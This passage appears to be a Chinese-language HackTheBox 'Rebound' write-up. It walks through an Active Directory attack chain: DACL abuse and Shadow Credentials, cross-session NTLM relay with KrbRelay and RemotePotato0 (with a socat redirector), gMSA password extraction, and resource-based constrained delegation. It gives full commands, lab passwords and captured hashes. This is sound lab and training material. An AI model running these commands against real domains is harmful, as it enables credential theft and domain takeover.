<h2 id="利用Shadow-Credentials（替代修改winrm-svc的密码）"><a href="#利用Shadow-Credentials（替代修改winrm-svc的密码）" class="headerlink" title="利用Shadow Credentials（替代修改winrm_svc的密码）"></a>利用Shadow Credentials（替代修改<code>winrm_svc</code>的密码）</h2><p>修改密码的方式会在一段时间后失效，同时修改密码的操作可能会引起蓝队操作人员的关注，我们使用另一种方式实现<code>shell</code>的获取，即<code>Shadow Credentials</code>，这种方法会给我们提供<code>winrm_svc</code>账户的哈希，我们仍然可以用于<code>winrm</code>登录，也叫做<code>UnPAC the hash</code>，主要流程在之后的文章中介绍，先给一个流程图</p>
<p><img src="/2025/03/02/HTB-Rebound/unpacthehash_schema.webp" alt="unpacthehash_schema"></p>
<p>在我们获得对<code>Service Users</code>组的<code>GenericAll</code>权限（即我们所熟知的<code>FullControl</code>）之后，我们将<code>FullControl</code>权限延展到属于这个OU的对象中，我们关注一下BloodHound中的<code>Descendant Objects</code></p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250223163937.png" alt="微信截图_20250223163937"></p>
<p>我们将权限拓展到子对象<code>winrm_svc</code>上，下面的命令效果和我们之前的bloodyAD实现的一样</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dacledit rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -k -dc-ip 10.10.11.231 -action write -rights FullControl -inheritance -principal oorend -target-dn <span class="string">&quot;OU=Service Users,DC=rebound,DC=htb&quot;</span> -use-ldaps</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>impacket-dacledit</code>：用于编辑 Active Directory 对象的<code>DACL（Discretionary Access Control List）</code>。它可以用于修改对象的权限，赋予指定用户不同级别的权限。</p>
<p><strong><code>-rights FullControl</code></strong>:  指定要分配给目标用户或组的权限。</p>
<p><strong><code>-inheritance</code></strong>：表示权限继承。这意味着权限将从父对象传递给目标对象的子对象。</p>
<p><strong><code>-principal oorend</code></strong>：目标用户或组。在这种情况下，<code>oorend</code> 用户将获得指定权限（<code>FullControl</code>）到目标对象。</p>
<p><strong><code>-target-dn &quot;OU=Service Users,DC=rebound,DC=htb&quot;</code></strong>：指定目标对象的 Distinguished Name (DN)，即我们要修改的 AD 对象。</p>
</blockquote>
<p>执行Shadow Credentials攻击</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow auto -u oorend@rebound.htb -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -account winrm_svc -target dc01.rebound.htb -dc-ip 10.10.11.231 -k</span><br></pre></td></tr></table></figure>
<p>或者参考下面的文章</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/119637917">https://blog.csdn.net/qq_41874930/article/details/119637917</a></p>
<h2 id="Cross-Session-Lateral-Movement"><a href="#Cross-Session-Lateral-Movement" class="headerlink" title="Cross Session Lateral Movement"></a>Cross Session Lateral Movement</h2><p><code>winrm_svc</code>用户家目录没有其他有价值的东西</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250223173517.png" alt="微信截图_20250223173517"></p>
<blockquote>
<p>使用<code>ls -recurse .</code>也是一个不错的选择</p>
</blockquote>
<p>我们现在要确定下一步的高价值目标，我们在查看当前机器上运行的进程时发现存在两个session，也就是说这台机器上还存在另一个已经登录的用户</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250223174952.png" alt="微信截图_20250223174952"></p>
<p>那么我们可以猜测另一个已经登录的账户可能是一个高特权账户，我们需要对其进行利用</p>
<p>我们这里有一个命令<code>qwinsta</code>（Query WINdows STAtion）是 Windows 内置的命令行工具，用于查询当前系统上的远程桌面会话（RDP 会话）或本地会话的状态信息。</p>
<blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;qwinsta [用户名 | 会话名 | 会话 <span class="type">ID</span>] [/<span class="type">server</span>:服务器名] [/<span class="type">mode</span>] [/<span class="type">connect</span>] [/<span class="type">counter</span>]</span><br></pre></td></tr></table></figure>
<p>常见的参数有</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>无参数</code></td>
<td>显示本地计算机上的所有会话信息。</td>
</tr>
<tr>
<td><code>/server:&lt;服务器&gt;</code></td>
<td>指定查询的远程服务器（默认为本地）。</td>
</tr>
<tr>
<td><code>&lt;用户名&gt;</code></td>
<td>查询指定用户的会话信息。</td>
</tr>
<tr>
<td><code>&lt;会话名&gt;</code></td>
<td>查询指定会话名的会话信息。</td>
</tr>
<tr>
<td><code>&lt;会话 ID&gt;</code></td>
<td>查询指定会话 ID 的会话信息。</td>
</tr>
<tr>
<td><code>/mode</code></td>
<td>显示会话的当前模式（如连接模式）。</td>
</tr>
<tr>
<td><code>/connect</code></td>
<td>显示连接的详细信息。</td>
</tr>
<tr>
<td><code>/counter</code></td>
<td>显示会话的统计数据。</td>
</tr>
</tbody>
</table>
</div>
<p>在我们具有特定的Windows权限时，我们可以劫持管理员RDP会话</p>
<p><code>tscon</code>（Terminal Services CONnect）是 Windows 终端服务的一个命令行工具，用于连接或切换到指定的远程桌面会话（RDP 会话）。在权限足够的情况下，攻击者可以利用它来劫持管理员的 RDP 会话，从而无需凭据直接获取管理员权限。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;tscon &lt;SessionID&gt; [/<span class="type">dest</span>:&lt;<span class="type">DestinationName</span>&gt;] [/<span class="type">password</span>:&lt;<span class="type">Password</span>&gt;] [/<span class="type">v</span>]</span><br></pre></td></tr></table></figure>
<p>参数有</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;SessionID&gt;</code></td>
<td>需要切换的会话 ID，可使用 <code>qwinsta</code> 查询。</td>
</tr>
<tr>
<td><code>/dest:&lt;目标&gt;</code></td>
<td>目标会话名称（如 <code>console</code>）。</td>
</tr>
<tr>
<td><code>/password:&lt;密码&gt;</code></td>
<td>用于切换会话时提供密码（一般不常用）。</td>
</tr>
<tr>
<td><code>/v</code></td>
<td>详细模式，显示执行过程信息。</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
<p>但是这个命令无法运行在我们的目标机器上，我们需要使用<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">RunasCs</a>这个工具，它存在已经编译过的版本，我们直接传到靶机上即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /home/chromosome/HTB/Rebound/RunasCs.exe /tools/RunasCs.exe</span><br></pre></td></tr></table></figure>
<p>命令如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunasCs.exe username password cmd [-<span class="type">d</span> <span class="type">domain</span>] [-<span class="type">f</span> <span class="type">create_process_function</span>] [-<span class="type">l</span> <span class="type">logon_type</span>] [-<span class="type">r</span> <span class="type">host</span>:<span class="type">port</span>] [-<span class="type">t</span> <span class="type">process_timeout</span>] [--<span class="type">force</span>-<span class="type">profile</span>] [--<span class="type">bypass</span>-<span class="type">uac</span>] [--<span class="type">remote</span>-<span class="type">impersonation</span>]</span><br></pre></td></tr></table></figure>
<p>让我们确认一下当前机器上还有哪个用户在登录（利用<code>Run a command simulating the /netonly flag of runas.exe</code>）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe oorend <span class="string">&#x27;1GR8t@$$4u&#x27;</span> <span class="literal">-l</span> <span class="number">9</span> <span class="string">&quot;qwinsta&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>-l logon_type</code>的值可以在下面的网址中找到</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types</a></p>
</blockquote>
<p>和我们分析的一样，存在一个<code>tbrady</code>用户</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224190531.png" alt="微信截图_20250224190531"></p>
<p>利用bloodhound分析<code>tbrady</code>账户</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224185239.png" alt="微信截图_20250224185239"></p>
<p>它存在读取GMSA密码的权限</p>
<blockquote>
<p><code>ReadGMSAPassword</code>权限</p>
<p>此权限允许您读取<code>组托管服务帐户（Group Managed Service Account  GMSA）</code>的密码。组托管服务帐户是Active Directory中的一种特殊类型对象，该对象的密码由域控制器管理，并在设定的时间间隔内自动更改（检查MSDS-ManagedPasswordInterval属性）。</p>
<p>GMSA的预期用途是允许某些计算机帐户检索GMSA的密码，然后以该GMSA身份运行本地服务。拥有授权主体控制权的攻击者可以滥用此权限来模拟GMSA。</p>
<p><strong>GMSA（Group Managed Service Account，组托管服务账户）</strong> 是微软在 Windows Server 2012 中引入的一种<strong>托管服务账户（MSA, Managed Service Account）</strong>，主要用于提升安全性和简化密码管理。GMSA 允许多个计算机（如 Web 服务器群集或 SQL 服务器群集）共享一个自动管理的服务账户，并用于运行服务或任务，而不需要手动管理密码。</p>
<p><strong>计算机可以向 DC 请求当前的 GMSA 密码，但不会直接显示密码，而是通过 Kerberos 票据进行身份验证。</strong></p>
<p><strong>GMSA 不能用于交互式登录（即无法直接登录到计算机），只能用于运行服务或任务。</strong></p>
</blockquote>
<p>我们接下来将要滥用<code>tbrady</code>账户已经登录的会话，通过触发身份验证回传到我们的机器，并将其中继以转储哈希值。我们有两种方法可以实现上面的攻击方式。</p>
<h3 id="KrbRelay-RunAs"><a href="#KrbRelay-RunAs" class="headerlink" title="KrbRelay + RunAs"></a>KrbRelay + RunAs</h3><p>攻击的前提条件为：</p>
<ul>
<li>没有微软2022年10月的补丁</li>
<li>必须禁用LDAP签名（Windows默认值）</li>
</ul>
<p>LDAP禁用签名的验证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&quot;402 minutes&quot;</span> nxc ldap 10.10.11.231 -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -M ldap-checker -k </span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224191422.png" alt="微信截图_20250224191422"></p>
<p>对kKrbRelay进行编译，这里需要编译两个文件</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224191534.png" alt="微信截图_20250224191534"></p>
<p>然后将他们全部上传到靶机上（<code>CheckPort.exe</code>在攻击中并未用到）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /home/chromosome/HTB/Rebound/KrbRelay.exe KrbRelay.exe </span><br><span class="line">upload /home/chromosome/HTB/Rebound/CheckPort.exe CheckPort.exe</span><br></pre></td></tr></table></figure>
<p><code>CheckPort.exe</code>：用于发现OXID resolver可用端口的 C# 工具</p>
<blockquote>
<p><code>OXID Resolver</code>： 主要利用了<strong>OXID</strong>（<strong>Object Exchange Identifier</strong>）的机制，这是 Windows 中用于识别COM（Component Object Model）和DCOM（Distributed Component Object Model）的一种标识符。它与 <strong>DCE/RPC</strong>（分布式计算环境/远程过程调用）有关，通常涉及到 Windows 远程管理和其他分布式服务的通信。</p>
</blockquote>
<p>使用<code>-ntlm</code>指定NTLM认证，使用<code>-session</code> 指定会话号，并提供一个具有正确权限的有效 RPC 服务的 CLSID，在<a target="_blank" rel="noopener" href="https://github.com/cube0x0/KrbRelay#clsids">KrbRelay</a>的github仓库中的Windows Server 2019下的Cross-Session Relay值中选择一个即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe oorend <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -l 9 <span class="string">&quot;c:\users\winrm_svc\MyTools\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用<code>RunasCs.exe</code>的原因是：该漏洞利用需要一个交互式会话，例如控制台。在这些会话中，凭证被存储在内存中，因此可以被漏洞利用访问，而不像现在使用的 WinRM 远程会话</p>
</blockquote>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250224202033.png" alt="微信截图_20250224202033"></p>
<p>现在我们获得了<code>tbrady</code>的NetNTLMv2哈希，我们可以利用任何的密码破解工具进行自动化解密</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tbrady::rebound:a69b51d5e3c25c34:4b5740ddf88bad167dd80c375a00d2bb:0101000000000000c058b1acee86db015c815522b83bb4bb0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800c058b1acee86db01060004000600000008003000300000000000000001000000002000003efda9b6b168eda7a080c22519dd8969aad8f27bf444db463d23dd02f0df73580a00100000000000000000000000000000000000090000000000000000000000</span><br></pre></td></tr></table></figure>
<p>解密得到</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TBRADY::rebound:a69b51d5e3c25c34:4b5740ddf88bad167dd80c375a00d2bb:0101000000000000c058b1acee86db015c815522b83bb4bb0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800c058b1acee86db01060004000600000008003000300000000000000001000000002000003efda9b6b168eda7a080c22519dd8969aad8f27bf444db463d23dd02f0df73580a00100000000000000000000000000000000000090000000000000000000000:543BOMBOMBUNmanda</span><br></pre></td></tr></table></figure>
<p>和前两个账户一样没有winrm的权限</p>
<h3 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h3><blockquote>
<p>它利用了 DCOM 激活服务，并触发了目标机器上当前所有登录用户的 NTLM 认证。要求目标机器上有一个特权用户登录（例如，域管理员用户）。一旦 NTLM Type 1 认证被触发，我们设置一个跨协议的中继服务器，接收特权的 Type 1 消息，并通过解包 RPC 协议并将认证信息封装为 HTTP 协议后，将其中继到第三方资源。在接收端，你可以设置一个进一步的中继节点（例如 ntlmrelayx），或者直接中继到一个特权资源。RemotePotato0 还允许抓取并窃取机器上所有登录用户的 NTLMv2 哈希值。</p>
</blockquote>
<p>因为登录的是非管理员特权账户，我们的目标是进行横向移动</p>
<p>利用模块2 Rpc capture (hash) server + potato trigger</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RemotePotato0.exe -m 2 -s 1</span><br></pre></td></tr></table></figure>
<p>会显示出现问题</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely.</span><br><span class="line">[!] Example Network redirector:</span><br><span class="line"><span class="code">	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&#123;&#123;ThisMachineIp&#125;&#125;:9999</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这种类型的 RPC 连接将仅针对 TCP 135 端口。由于我无法在 Rebound 上监听 TCP 135（因为它已经在监听合法的 RPC 服务），我将让漏洞利用指向我的主机，然后将流量转发回 RemotePotato0 的 9999 端口。我将在我的主机上运行 socat：<code>sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999</code>。这样，流量将先到达我的主机的 135 端口，然后被转发回 Rebound 的 9999 端口，在那里 RemotePotato0 正在监听。</p>
</blockquote>
<p>我们在本机上设置一个<code>socat</code>监听器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999</span><br></pre></td></tr></table></figure>
<p>然后在目标机器上运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.31 -p 9999</span><br></pre></td></tr></table></figure>
<p>仍然可以中继到哈希</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250225214721.png" alt="微信截图_20250225214721"></p>
<h2 id="读取GMSA哈希"><a href="#读取GMSA哈希" class="headerlink" title="读取GMSA哈希"></a>读取GMSA哈希</h2><p>有多种方式进行读取<code>delegator$</code>账户哈希</p>
<h3 id="bloodyAD"><a href="#bloodyAD" class="headerlink" title="bloodyAD"></a>bloodyAD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -d rebound.htb -u tbrady -p <span class="string">&#x27;543BOMBOMBUNmanda&#x27;</span> --host dc01.rebound.htb</span><br><span class="line">get object <span class="string">&#x27;delegator$&#x27;</span> --resolve-sd --attr msDS-ManagedPassword</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong><code>--resolve-sd</code></strong>：解析对象的安全描述符（Security Descriptor, SD），包括权限和访问控制列表（ACLs）。</p>
<p><strong><code>--attr msDS-ManagedPassword</code></strong>：专门获取 <code>msDS-ManagedPassword</code> 属性，该属性包含gMSA的托管密码。</p>
</blockquote>
<p>返回NTLM哈希和base64编码后的形式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:45326e68995ec3b859228fd504be8617</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: J837EVqQxZaVQRIIcfXPa5QslWda+X7BVkj/v1Plp8QPgYPJ/X7cFKRxa2u1c5w32g7mkGxukmnyjgw5p/Q9dWtkO1Ok1CUPFla4DP9uzxHwRJdA7rFn7InTBTjuwXztetP3uqc39Yu8KPdh29wHEeog79QHNqok4LoqyUHzVA9qoZnglYjAKbNIFkafEB+47KIf6mEDmK4rnuGJEG+TaZVKBnw1tJ01+z8QoMiKtXV0GKNzqkTOEsdScQf08w8E6MSSoB2djg2ViXzmpWsQlrbhoGW3Es2C7eSx4wIEespxGn+EhD1N3bgnqbYTShO2xxcDaW7te6rGDkkLLtC5jw==</span><br></pre></td></tr></table></figure>
<h3 id="nxc"><a href="#nxc" class="headerlink" title="nxc"></a>nxc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> faketime <span class="string">&quot;402 minutes&quot;</span> ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa</span><br><span class="line"> </span><br><span class="line"> SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda </span><br><span class="line">LDAPS       10.10.11.231    636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAPS       10.10.11.231    636    DC01             Account: delegator$           NTLM: 45326e68995ec3b859228fd504be8617</span><br></pre></td></tr></table></figure>
<h3 id="GMSAPasswordReader"><a href="#GMSAPasswordReader" class="headerlink" title="GMSAPasswordReader"></a><a target="_blank" rel="noopener" href="https://github.com/rvazarkar/GMSAPasswordReader">GMSAPasswordReader</a></h3><p>bloodhound推荐的</p>
<p><code>delegator$</code>账户仍不适用于winrm登录</p>
<h2 id="利用基于资源的约束委派提权"><a href="#利用基于资源的约束委派提权" class="headerlink" title="利用基于资源的约束委派提权"></a>利用基于资源的约束委派提权</h2><p>在bloodhound中寻找<code>delegator$</code>的Constrained Delegations，似乎没有什么特别重要的委派权限</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250225222827.png" alt="微信截图_20250225222827"></p>
<p>我们使用另一个工具重新枚举一下委派权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-findDelegation <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -dc-ip 10.10.11.231 -k -hashes :45326e68995ec3b859228fd504be8617</span><br></pre></td></tr></table></figure>
<p>我们发现了一个可以利用的约束委派</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists </span><br><span class="line">-----------  -----------------------------------  --------------  ---------------------  ----------</span><br><span class="line">delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No         </span><br></pre></td></tr></table></figure>
<p>我们尝试进行利用一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST -spn http/dc01.rebound.htb -impersonate administrator -hashes :45326e68995ec3b859228fd504be8617 -dc-ip dc01.rebound.htb <span class="string">&#x27;rebound.htb/delegator\$&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226155606.png" alt="微信截图_20250226155606"></p>
<p>发现出现了报错<code>Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable</code>，说明我们利用的委派不是可以转发的，即没有启用<strong>Constrained Delegation with Protocol Transition</strong>（其实也就是使用任何身份验证协议这个选项），也就是说S4U2Self 步骤无法生成一个可转发的票据，从而导致 S4U2Proxy 步骤失败</p>
<blockquote>
<p>本质上，Service for User to Self（S4U2Self）协议使得一个服务可以代表其他用户请求一个服务票据，但该票据是供其自身使用的。相对地，Service for User to Proxy（S4U2Proxy）协议允许一个服务代表其他用户请求服务票据，但该票据是供其他服务使用的。</p>
</blockquote>
<p>我们接下来利用<code>-self</code>选项让程序在<code>S4U2Self</code>请求完票据后停下，返回一张<code>TGS</code>，不再让<code>S4U2Proxy</code>进行转发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-getST -spn http/dc01.rebound.htb -impersonate administrator -hashes :45326e68995ec3b859228fd504be8617 -dc-ip dc01.rebound.htb <span class="string">&#x27;rebound.htb/delegator\$&#x27;</span> -self</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226182559.png" alt="微信截图_20250226182559"></p>
<p>看一下这张票据的属性</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-describeTicket administrator@delegator\<span class="variable">$@REBOUND</span>.HTB.ccache </span><br></pre></td></tr></table></figure>
<p>在<code>Flag</code>属性中缺少<code>forwardable</code>标志</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226182835.png" alt="微信截图_20250226182835"></p>
<p>现在我们看一下Resource-Based Constrained Delegation流程（来自这篇<a target="_blank" rel="noopener" href="https://myzxcg.com/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/#contents:%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">文章</a>）：</p>
<ol>
<li>服务1使用自己的Hash向KDC申请一个TGT票据（可转发的）。</li>
<li>服务1代表用户申请一个获得针对服务1自身的kerberos服务票据(S4U2SELF过程，返回的票据是不可转发的）这个过程设置Resource-Based Constrained Delegation(RBCD)标志位。</li>
<li>服务1可以使用来自用户的授权( 在S4U2SELF阶段获得的不可转发的TGS)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的可转发的TGS。</li>
</ol>
<p>我们发现这里的第二步的不可转发票据和我们当前的情况十分类似，因此我们可以基于RBCD进行利用。（这里还存在一种思路即强制或等待用户向服务进行身份验证，同时运行一个 Kerberos 监听器但是不是特别适合）</p>
<p>基于这种委派我们主要关注<code>msDS-AllowedToDelegateTo</code>属性（配置传出信任）和<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>（配置传入信任）</p>
<p>利用步骤仍然参考这篇<a target="_blank" rel="noopener" href="https://myzxcg.com/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/#contents:%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">文章</a></p>
<ol>
<li>拥有一个任意的服务账户1或者计算机账户1</li>
<li>获得了服务账户2的LDAP权限（即有修改服务账户2属性的权限）</li>
<li>配置服务1对服务2的约束委派，在服务账户2的用户属性上配置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 为服务账户1的SID</li>
<li>发起一个从服务1到服务2的正常的约束委派的流程访问服务2</li>
</ol>
<p><strong>注：这里在选择服务的时候基于一条约束条件为该服务必须至少有一个 SPN</strong></p>
<p>我们将把<code>ldap_monitor</code>添加到 <code>delegator$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中，从而允许 <code>ldap_monitor</code>委派到 <code>delegator$</code></p>
<p>将<code>dc01</code>添加到host文件中，否则我们接下来将利用的工具将报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.231 dc01 dc01.rebound.htb rebound.htb</span><br></pre></td></tr></table></figure>
<p>执行下面的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> python3 rbcd.py rebound.htb/delegator$ -hashes :45326e68995ec3b859228fd504be8617 -k -delegate-from ldap_monitor -delegate-to delegator$ -action write -dc-ip dc01 -use-ldaps</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong><code>-delegate-from ldap_monitor</code></strong>：指定要添加到 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的服务账户，这里是 <code>ldap_monitor</code>。</p>
<p><strong><code>-delegate-to delegator$</code></strong>：指定目标服务账户，这里是 <code>delegator$</code>。</p>
<p><strong><code>-action write</code></strong>：指定操作类型为“写入”，即将 <code>ldap_monitor</code> 添加到 <code>delegator$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中。</p>
</blockquote>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226192729.png" alt="微信截图_20250226192729"></p>
<p>利用powerview验证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject -Identity delegator$</span><br></pre></td></tr></table></figure>
<p>但是在执行完成返回的查询中并没有看到这个属性</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226193105.png" alt="微信截图_20250226193105"></p>
<p>使用findDelegation再次查看委派</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> impacket-findDelegation <span class="string">&#x27;rebound.htb/delegator$&#x27;</span> -dc-ip 10.10.11.231 -k -hashes :45326e68995ec3b859228fd504be8617</span><br></pre></td></tr></table></figure>
<p>从下图中我们可以看到新添加的委派已经成功添加了</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226192942.png" alt="微信截图_20250226192942"></p>
<p>到现在为止，RBCD攻击的所有准备已经完成，我们将完成最后的攻击：其核心思想是，我们可以从 <code>ldap_monitor</code> 请求一张针对 <code>delegator$</code> 的票据，并为模拟的账户创建一张可转发的服务票据（Service Ticket）。</p>
<p>现在让我们选择合适的用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity Administrator</span><br></pre></td></tr></table></figure>
<p>管理员账户不能被委派</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250226193852.png" alt="微信截图_20250226193852"></p>
<p>那么我们选择<code>dc01</code>上的机器账户<code>DC01$</code></p>
<p>这张可转发的ST随后可以利用 <code>delegator$</code> 的约束委派权限，转发到域控制器（DC），从而为 <code>DC01$</code> 生成一张针对域控制器的ST。</p>
<p>首先，我们从 <code>ldap_monitor</code> 请求一张针对 <code>delegator$</code> 的服务票据ST，并模拟 <code>DC01$</code> 账户。</p>
